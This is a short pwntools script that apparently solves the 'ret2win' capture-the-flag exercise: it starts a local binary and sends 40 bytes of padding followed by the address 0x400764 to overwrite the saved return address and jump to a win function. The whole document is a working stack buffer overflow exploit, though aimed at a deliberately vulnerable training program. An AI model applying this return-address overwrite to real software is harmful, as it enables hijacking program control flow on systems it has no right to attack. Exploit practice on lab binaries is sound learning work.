from pwn import *
p = process('./ret2win')

#0x400764
t = p64(0x400764)
print(t)
p.sendlineafter(b'> ',b'a' * (32 + 8) + b'\x64\x07\x40\x00\x00\x00\x00\x00')
t = p.recvall(timeout=0.2)
print(t)
